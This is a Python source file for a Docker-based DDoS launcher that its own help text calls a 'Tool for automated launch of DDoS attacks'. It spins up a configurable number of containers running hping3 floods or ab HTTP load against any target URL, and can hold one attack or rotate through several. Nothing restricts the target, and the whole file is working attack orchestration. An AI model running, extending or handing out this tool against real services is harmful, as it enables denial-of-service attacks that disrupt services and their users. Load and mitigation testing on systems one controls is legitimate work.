import argparse
from datetime import datetime
import docker
from itertools import cycle
import signal
import time
import sys
import yaml


class Soda():
    ATTACKS_PATH = 'attacks.yml'

    def __init__(self):
        self.attacks = self.read_attacks(self.ATTACKS_PATH)
        self.attacks_pool = []
        self.interval = None
        self.threads = 1
        self.network = None
        self._target_service = None
        self.containers = []
        signal.signal(signal.SIGINT, self.signal_handler)
        self.client = docker.from_env()

    def read_attacks(self, path):
        with open(path) as f:
            return yaml.safe_load(f)

    def list_attacks(self):
        i = 0
        for attack in self.attacks:
            print('%s: %s' % (i, attack['name']))
            i += 1

    @property
    def target_service(self):
        return self._target_service

    @target_service.setter
    def target_service(self, url):
        self._target_service = Target_Service(url)

    def add_attacks_to_pool(self, ids):
        for attack_id in ids:
            self.attacks_pool.append(Attack(self.attacks[attack_id],
                                            self.target_service))

    def create_worker_container(self, attack):
        if self.network:
            container = self.client.containers.create(attack.image,
                                                      attack.command(),
                                                      network=self.network)
        else:
            container = self.client.containers.create(attack.image,
                                                      attack.command())
        return container

    def launch_static_attack(self):
        attack = self.attacks_pool[0]
        print('%s ATTACK START: %s: %s' % (datetime.now(), attack.name,
                                           attack.command()))
        for _ in range(self.threads):
            container = self.create_worker_container(attack)
            self.containers.append(container)
            container.start()
        time.sleep(self.interval)
        print('%s ATTACK STOP: %s' % (datetime.now(), attack.name))
        for container in self.containers:
            container.remove(force=True)
        self.containers.clear()

    def launch_rotating_attacks(self):
        for attack in cycle(self.attacks_pool):
            print('%s ATTACK START: %s: %s' % (datetime.now(), attack.name,
                                               attack.command()))
            for _ in range(self.threads):
                container = self.create_worker_container(attack)
                self.containers.append(container)
                container.start()
            time.sleep(self.interval)
            print('%s ATTACK STOP: %s' % (datetime.now(), attack.name))
            for container in self.containers:
                container.remove(force=True)
            self.containers.clear()

    def signal_handler(self, sig, frame):
        print('Killing all running containers...')
        for container in self.containers:
            print(container.name)
            container.remove(force=True)
        sys.exit(0)


class Target_Service():
    def __init__(self, url):
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        self.url = url
        self.scheme = parsed_url.scheme
        self.host = parsed_url.hostname
        self.port = parsed_url.port
        self.path = parsed_url.path


class Attack():
    def __init__(self, config, target_service):
        self.name = config['name']
        self.tool = config['tool']
        self.flags = config['flags']
        self.target_service = target_service
        if self.tool == 'hping3':
            self.image = 'utkudarilmaz/hping3'
        elif self.tool == 'ab':
            self.image = 'jordi/ab'

    def _flags(self):
        flags = []
        if type(self.flags) == list:
            for flag in self.flags:
                flag = flag.split()
                flags += flag
            if self.tool == 'hping3' and '-p' not in flags:
                flags.append('-p')
                flags.append(str(self.target_service.port))
        return flags

    def command(self):
        command = []
        if self.tool == 'hping3':
            command += self._flags()
            command += [self.target_service.host]
        if self.tool == 'ab':
            command += self._flags()
            command += [self.target_service.url]
        return ' '.join(command)


def main():
    parser = argparse.ArgumentParser(
        description='Tool for automated launch of DDoS attacks')
    parser.add_argument('-i', '--interval',
                        help='Attack rotation interval', type=int, default=60)
    parser.add_argument('-a', '--attacks',
                        help='Attack type(s). Comma separated in case of \
                              multiple attacks',
                        nargs='+', type=int)
    parser.add_argument('-n', '--network',
                        help='Docker Network to put containers to', type=str,
                        default=None)
    parser.add_argument('-m', '--mode',
                        help='Attack mode static/rotate',
                        type=str, default='static')
    parser.add_argument('-t', '--threads',
                        help='Number of attack generation tool threads',
                        type=int, default=1)
    parser.add_argument('-l', '--list',
                        help='List all avaliale attacks', action='store_true')
    parser.add_argument('-d', '--target-service',
                        help='Target service', type=str)

    args, unknown = parser.parse_known_args()

    soda = Soda()

    if args.list:
        soda.list_attacks()
        sys.exit(0)

    if not args.target_service:
        parser.error('Please specify attack destination with "-d" flag')
    else:
        soda.target_service = args.target_service

    if not args.attacks:
        parser.error('Give at least one attack type with "-a" flag')
    else:
        soda.add_attacks_to_pool(args.attacks)

    soda.threads = args.threads

    soda.interval = args.interval

    soda.network = args.network

    if args.mode == 'static':
        soda.launch_static_attack()
    elif args.mode == 'rotate':
        soda.launch_rotating_attacks()
    else:
        print('No such attack mode supported')
        sys.exit(1)


if __name__ == "__main__":
    main()
